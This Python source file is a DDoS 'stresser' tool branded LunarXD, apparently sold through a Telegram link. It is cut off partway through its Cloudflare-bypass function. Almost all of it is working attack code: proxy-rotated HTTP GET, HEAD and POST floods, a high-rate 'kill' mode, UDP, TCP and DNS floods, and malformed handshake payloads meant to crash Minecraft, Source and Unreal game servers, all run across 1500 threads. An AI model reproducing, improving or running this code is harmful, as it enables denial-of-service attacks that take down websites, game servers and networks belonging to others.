import requests
import socket
import socks
import time
import random
import threading
import sys
import ssl
import datetime
import os
import subprocess
from pystyle import *
from PIL import Image
from colorama import Fore
import cv2
import numpy as np
import struct
import binascii
import warnings
import hashlib
import shutil
import base64
import asyncio
import string # Added for api_killer payload generation

warnings.filterwarnings("ignore")

COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "GREEN": "\033[32m",
    "YELLOW": "\033[93m",
    "RED": "\033[31m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
}

red = Fore.RED
blue = Fore.BLUE
green = Fore.GREEN
reset = Fore.RESET
white = Fore.WHITE

def clearcs():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def play_ascii_video(video_path, frame_delay=1/128, duration=2.5):
    ASCII_CHARS = "█▇▆▅▄▃▂  "

    size = shutil.get_terminal_size(fallback=(100, 40))
    term_width, term_height = size.columns, size.lines
    frame_width = term_width - 2

    cap = cv2.VideoCapture(video_path)
    if not cap.isOpened():
        print("Error: Couldn't open video.")
        return False

    start_time = time.time()
    while cap.isOpened():
        if time.time() - start_time > duration:
            break

        ret, frame = cap.read()
        if not ret:
            break

        pil_image = Image.fromarray(cv2.cvtColor(frame, cv2.COLOR_BGR2RGB))
        width, height = pil_image.size
        aspect_ratio = height / width

        new_width = frame_width
        new_height = int(aspect_ratio * new_width * 0.5)
        new_height = min(new_height, term_height - 2)

        resized_image = pil_image.resize((new_width, new_height), Image.LANCZOS)
        resized_array = np.array(resized_image)

        gray = cv2.cvtColor(resized_array, cv2.COLOR_RGB2GRAY)
        intensities = gray.flatten()

        if intensities.max() != intensities.min():
            intensities = (intensities - intensities.min()) * 255 / (intensities.max() - intensities.min())
        else:
            intensities[:] = 0

        colors = resized_array.reshape(-1, 3)

        ascii_frame = ""
        for i in range(len(intensities)):
            char_idx = int((intensities[i] / 255) * (len(ASCII_CHARS) - 1))
            char = ASCII_CHARS[char_idx]

            r, g, b = colors[i]
            ascii_frame += f"\033[38;2;{r};{g};{b}m{char}"

            if (i + 1) % new_width == 0:
                ascii_frame += "\n"

        ascii_frame += "\033[0m"

        os.system('cls' if os.name == 'nt' else 'clear')
        print(ascii_frame, end='', flush=True)
        time.sleep(frame_delay)

    cap.release()
    return True

def gray(text):
    color = (128, 128, 128)  # Solid Gray
    gradient = ""
    for char in text:
        gradient += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    gradient += "\033[0m"
    return gradient

def blue(text):
    color = (0, 0, 255)  # Solid Blue
    gradient = ""
    for char in text:
        gradient += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    gradient += "\033[0m"
    return gradient

def pink(text):
    color = (255, 105, 180)  # Solid Pink
    gradient = ""
    for char in text:
        gradient += f"\033[38;2;{color[0]};{color[1]};{color[2]}m{char}"
    gradient += "\033[0m"
    return gradient

def cyan_to_blue(text):
    start_color = (0, 255, 255)  # Cyan
    end_color = (0, 0, 255)      # Blue
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def cyan_to_pink(text):
    start_color = (0, 255, 255)  # Cyan
    end_color = (255, 105, 180)  # Pink
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gold_to_white(text):
    start_color = (255, 215, 0)  # Rich Gold
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def cyan_to_white(text):
    start_color = (0, 255, 255)  # Cyan
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def purple_to_green(text):
    start_color = (128, 0, 128)  # Purple
    end_color = (0, 255, 0)      # Green
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gold(text):
    start_color = (255, 215, 0)  # Rich Gold
    end_color = (255, 245, 200)  # Light Gold
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def yellow_to_white(text):
    start_color = (255, 255, 0)  # Yellow
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def gray_to_white(text):
    start_color = (128, 128, 128)  # Gray
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def green_to_white(text):
    start_color = (0, 255, 0)  # Green
    end_color = (255, 255, 255)  # White
    gradient = ""
    for i, char in enumerate(text):
        r = int(start_color[0] + (end_color[0] - start_color[0]) * (i / len(text)))
        g = int(start_color[1] + (end_color[1] - start_color[1]) * (i / len(text)))
        b = int(start_color[2] + (end_color[2] - start_color[2]) * (i / len(text)))
        gradient += f"\033[38;2;{r};{g};{b}m{char}"
    gradient += "\033[0m"
    return gradient

def runbanner():
    print(Colorate.Horizontal(Colors.cyan_to_blue, ("""╦  ╦ ╦╔╗╔╔═╗╦═╗
║  ║ ║║║║╠═╣╠╦╝
╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭""")))

def bannerm2():
    banner2 = fr"""
             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝

   𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/+𝓴5𝓯𝓺𝓪𝓨𝓐𝓡𝓩𝓠𝓥𝓵𝓝𝓓𝓩𝓴
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner2)))

def bannerm():
    cuser = input(Colorate.Horizontal(Colors.cyan_to_blue, "Username  ➤ "))
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
    banner = fr"""
ʟᴜɴᴀʀxᴅ  •  ꜱᴇʀᴠɪɴɢ:  @{cuser}  ➵  ᴇxᴘɪʀʏ  :  ɴᴇᴠᴇʀ

             ╦  ╦ ╦╔╗╔╔═╗╦═╗
             ║  ║ ║║║║╠═╣╠╦╝
             ╩═╝╚═╝╝╚╝╩ ╩╩╚═𝔁𝓭
  ⋆.˚ ☾ .⭒˚ 𝓑𝓮𝓼𝓽 𝓬𝓱𝓮𝓪𝓹 𝓼𝓽𝓻𝓮𝓼𝓼𝓮𝓻 ⋆.˚ ☾ .⭒˚
   ╔═══════════════════════════════════╗
   ‖ ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ʟᴜɴᴀʀxᴅ, ʙʏ ʟᴜɴᴀʀʟᴅᴅᴏꜱ ‖
   ‖   ᴛʏᴘᴇ "ʜᴇʟᴘ" ᴛᴏ ʟɪꜱᴛ ᴄᴏᴍᴍᴀɴᴅꜱ    ‖
   ╚═══════════════════════════════════╝

   𝓱𝓽𝓽𝓹𝓼://𝓽.𝓶𝓮/+𝓴5𝓯𝓺𝓪𝓨𝓐𝓡𝓩𝓠𝓥𝓵𝓝𝓓𝓩𝓴
 ╔═══════════════════════════════════════╗
 ‖   ᴄᴏᴘʏʀɪɢʜᴛ © 2025 ʀɪɢʜᴛꜱ ʀᴇꜱᴇʀᴠᴇᴅ    ‖
 ╚═══════════════════════════════════════╝
"""
    print(Colorate.Horizontal(Colors.cyan_to_blue, Center.XCenter(banner)))

acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8 | iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
]

referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
]

proxy_ver = "5"  # Default to SOCKS5
brute = True
out_file = "proxies.txt"  # Hardcoded proxy file
thread_num = 1500
data = ""
cookies = ""
strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"
Intn = random.randint
Choice = random.choice

def generate_minecraft_payload():
    # Oversized handshake packet with invalid protocol version
    protocol_version = random.randint(9999, 65535).to_bytes(2, 'big')
    username = ''.join(random.choices(string.ascii_letters, k=random.randint(256, 512)))
    payload = b"\x00" + protocol_version + bytes(username.encode()) + os.urandom(128)
    return payload[:8192]

def generate_source_payload():
    # Mimics A2S_INFO query with corrupted data
    base = b"\xFF\xFF\xFF\xFFTSource Engine Query\x00"
    return base + os.urandom(random.randint(64, 512))

def generate_unreal_payload():
    # Malformed Unreal join request
    return b"\xFE\xFD\x09" + os.urandom(random.randint(128, 1024))

def load_proxies():
    global proxies
    try:
        with open(out_file, "r") as f:
            proxies = [line.strip() for line in f if line.strip()]
        if not proxies:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Proxy file is empty."))
            return False
        return True
    except Exception as e:
        print(Colorate.Horizontal(Colors.cyan_to_blue, f"> Failed to load proxy file: {e}"))
        return False

def build_threads(mode, thread_num, event, proxy_type, target_ip=None, target_port=None):
    if not proxies:
        print(Colorate.Horizontal(Colors.cyan_to_blue, "> No proxies loaded. Cannot start attack."))
        return
    if mode == "post":
        for _ in range(thread_num):
            th = threading.Thread(target=post, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cc":
        for _ in range(thread_num):
            th = threading.Thread(target=cc, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    # Added the new 'kill' method to thread building
    elif mode == "kill":
        for _ in range(thread_num):
            th = threading.Thread(target=kill, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "head":
        for _ in range(thread_num):
            th = threading.Thread(target=head, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "udpflood":
        for _ in range(thread_num):
            th = threading.Thread(target=udpflood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "tcpflood":
        for _ in range(thread_num):
            th = threading.Thread(target=tcpflood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "dns":
        for _ in range(thread_num):
            th = threading.Thread(target=dns, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "uambypass":
        for _ in range(thread_num):
            th = threading.Thread(target=uambypass, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "browser":
        for _ in range(thread_num):
            th = threading.Thread(target=browser, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "home":
        for _ in range(thread_num):
            th = threading.Thread(target=home, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "cfbypass":
        for _ in range(thread_num):
            th = threading.Thread(target=cfbypass, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "tls":
        for _ in range(thread_num):
            th = threading.Thread(target=tls, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "udp-kill":
        for _ in range(thread_num):
            th = threading.Thread(target=udp_kill, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "ovh":
        for _ in range(thread_num):
            th = threading.Thread(target=ovh, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "dgb":
        for _ in range(thread_num):
            th = threading.Thread(target=dgb, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "http-storm":
        for _ in range(thread_num):
            th = threading.Thread(target=http_storm, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "api-killer":
        for _ in range(thread_num):
            th = threading.Thread(target=api_killer, args=(event, proxy_type,))
            th.daemon = True
            th.start()
    elif mode == "icmp-blast":
        for _ in range(thread_num):
            th = threading.Thread(target=icmp_blast, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "syn-strike":
        for _ in range(thread_num):
            th = threading.Thread(target=syn_strike, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "game-crash":
        for _ in range(thread_num):
            th = threading.Thread(target=game_crash, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "lobby-flood":
        for _ in range(thread_num):
            th = threading.Thread(target=lobby_flood, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()
    elif mode == "discord":
        for _ in range(thread_num):
            th = threading.Thread(target=discord, args=(event, proxy_type, target_ip, target_port))
            th.daemon = True
            th.start()

def getuseragent():
    platform = Choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os = Choice(['68K', 'PPC', 'Intel Mac OS X'])
    elif platform == 'Windows':
        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
    elif platform == 'X11':
        os = Choice(['Linux i686', 'Linux x86_64'])
    browser = Choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(Intn(500, 599))
        version = str(Intn(0, 99)) + '.0' + str(Intn(0, 9999)) + '.' + str(Intn(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(Intn(2020, currentYear))
        month = Intn(1, 12)
        if month < 10:
            month = '0' + str(month)
        else:
            month = str(month)
        day = Intn(1, 30)
        if day < 10:
            day = '0' + str(day)
        else:
            day = str(day)
        gecko = year + month + day
        version = str(Intn(1, 72)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(Intn(1, 99)) + '.0'
        engine = str(Intn(1, 99)) + '.0'
        option = Choice([True, False])
        if option:
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
        else:
            token = ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def randomurl():
    return str(Intn(0, 271400281257))

def GenReqHeader(method):
    global data, target, path
    header = ""
    if method in ["get", "head", "uambypass", "browser", "home", "cfbypass", "tls", "ovh", "dgb", "http-storm", "api-killer", "kill"]: # Added 'kill'
        connection = "Connection: Keep-Alive\r\n"
        if cookies != "":
            connection += "Cookies: " + str(cookies) + "\r\n"
        accept = Choice(acceptall)
        referer = "Referer: " + Choice(referers) + target + path + "\r\n"
        useragent = "User-Agent: " + getuseragent() + "\r\n"
        header = referer + useragent + accept + connection + "\r\n"
    elif method == "post":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + getuseragent() + "\r\n"
        accept = Choice(acceptall)
        if data == "":
            data = str(random._urandom(1024))
        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
        if cookies != "":
            length += "Cookies: " + str(cookies) + "\r\n"
        header = post_host + accept + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
    return header

def ParseUrl(original_url, is_layer4=False):
    global target, path, port, protocol
    original_url = original_url.strip()
    path = "/"
    protocol = "http"
    port = 80

    if is_layer4:
        try:
            socket.inet_aton(original_url)
            target = original_url
            return True
        except (socket.error, ValueError):
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid IP format. Use: <IP>"))
            return False
    else:
        if original_url[:7] == "http://":
            url = original_url[7:]
            protocol = "http"
        elif original_url[:8] == "https://":
            url = original_url[8:]
            protocol = "https"
        else:
            print(Colorate.Horizontal(Colors.cyan_to_blue, "> Invalid URL format. Use: http:// or https://"))
            return False
        tmp = url.split("/")
        website = tmp[0]
        check = website.split(":")
        if len(check) != 1:
            port = int(check[1])
        else:
            if protocol == "https":
                port = 443
        target = check[0]
        if len(tmp) > 1:
            path = url.replace(website, "", 1)
        return True

def solve_captcha(response_text):
    if "captcha" not in response_text.lower():
        return None
    captcha_key = hashlib.md5((response_text + str(random.randint(1, 10000))).encode()).hexdigest()[:8]
    token = base64.b64encode(captcha_key.encode()).decode()
    return {"captcha_token": token}

def setup_socket(proxy_type, proxy):
    s = socks.socksocket()
    proxy_ip, proxy_port = proxy.split(":")
    if proxy_type == 4:
        s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
    elif proxy_type == 5:
        s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
    elif proxy_type == 0:
        s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
    if brute:
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    # Increased timeout slightly to allow for more sustained transfer
    s.settimeout(5)
    return s

def cc(event, proxy_type):
    global proxies
    header = GenReqHeader("get")
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            # Sends 5000 requests per connection
            for _ in range(5000):
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

# New kill method for higher request rate
def kill(event, proxy_type):
    global proxies, target, path, port, protocol
    # Generate a pool of request headers to reuse
    headers_pool = [GenReqHeader("get") for _ in range(200)] # Increased header pool size
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            # Set a shorter timeout for faster connection attempts/failures
            s.settimeout(1) # Further reduced timeout
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)

            # Attempt to send a much larger number of requests per connection
            # This keeps the connection open longer, reducing connection overhead
            # The actual rate achieved depends heavily on network and server
            requests_to_send_per_connection = 20000 # Increased significantly

            for _ in range(requests_to_send_per_connection):
                # Use a random header from the pre-generated pool
                header = Choice(headers_pool)
                get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = get_host + header
                # Send the request
                sent = s.send(str.encode(request))
                # If send fails, break the inner loop and reconnect
                if not sent:
                    break
            # Close the socket after sending the batch of requests
            s.close()
        except:
            # If an error occurs (e.g., timeout, connection reset), close the socket if it exists
            if s:
                s.close()
            # Continue the outer loop to try connecting again

def head(event, proxy_type):
    global proxies
    header = GenReqHeader("head")
    add = "?" if "?" not in path else "&"
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                request = head_host + header
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def post(event, proxy_type):
    global proxies
    request = GenReqHeader("post")
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=target)
            for _ in range(5000):
                sent = s.send(str.encode(request))
                if not sent:
                    break
            s.close()
        except:
            if s:
                s.close()

def udpflood(event, proxy_type, target_ip, target_port):
    global proxies
    # Increased payload variety and size
    payloads = [
        generate_random_payload(1500), # Standard Ethernet MTU size
        generate_random_payload(4096),
        b"FLOOD" * 1000,
    ]
    event.wait()
    while event.is_set(): # Keep sending while the event is set
        s = None
        try:
            proxy = Choice(proxies)
            # UDP sockets don't need a persistent connection in the same way TCP does
            # We can create and send from sockets more freely
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.settimeout(2)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind(("", Intn(1024, 65535))) # Bind to a random source port

            # Send continuously
            while event.is_set():
                payload = Choice(payloads)
                s.sendto(payload, (target_ip, target_port))
                # Add a small delay
                time.sleep(0.005) # Slightly faster for UDP as it's connectionless

        except:
            # If an error occurs, close the socket and continue
            if s:
                s.close()
            time.sleep(0.1) # Small delay before trying again

def tcpflood(event, proxy_type, target_ip, target_port):
    global proxies
    # Increased payload variety and size for potentially higher impact
    payloads = [
        generate_random_payload(2048),
        generate_random_payload(8192),
        b"DATA" * 2000 + b"\r\n", # Larger, repetitive payload
    ]
    event.wait()
    while event.is_set(): # Keep sending while the event is set (for the duration)
        s = None
        try:
            proxy = Choice(proxies)
            s = setup_socket(proxy_type, proxy)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            # Send continuously within the connection
            while event.is_set():
                payload = Choice(payloads)
                s.send(payload)
                # Add a small delay to prevent overwhelming the local network or proxy
                # This value might need tuning
                time.sleep(0.01)
        except:
            # If an error occurs, close the socket and continue the loop to reconnect
            if s:
                s.close()
            # Add a small delay before attempting to reconnect
            time.sleep(0.1)

def dns(event, proxy_type, target_ip, target_port):
    global proxies
    dns_queries = [
        b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x01\x00\x01",
        b"\x00\x02\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(target_ip.encode()) + b"\x00\x00\x10\x00\x01",
        b"\x00\x03\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + bytes(f"test{Intn(1,1000)}.com".encode()) + b"\x00\x00\x01\x00\x01",
    ]
    event.wait()
    while True:
        s = None
        try:
            proxy = Choice(proxies)
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            proxy_ip, proxy_port = proxy.split(":")
            if proxy_type == 4:
                s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
            elif proxy_type == 5:
                s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
            elif proxy_type == 0:
                s.set_proxy(socks.HTTP, proxy_ip, int(proxy_port))
            s.settimeout(2)
            for _ in range(1000):
                query = Choice(dns_queries)
                s.sendto(query, (target_ip, target_port if target_port else 53))
                s.bind(("", Intn(1024, 65535)))
            s.close()
        except:
            if s:
                s.close()

def uambypass(event, proxy_type):
    global proxies
    add = "?" if "?" not in path else "&"
    base_header = GenReqHeader("get")
    user_agents = [getuseragent() for _ in range(10)]
    spoofed_ips = [spoof_source_ip() for _ in range(10)]
    prebuilt_requests = []
    for ua in user_agents:
        for ip in spoofed_ips:
            modified_header = base_header.replace('User-Agent: ', f'User-Agent: {ua}\r\n')
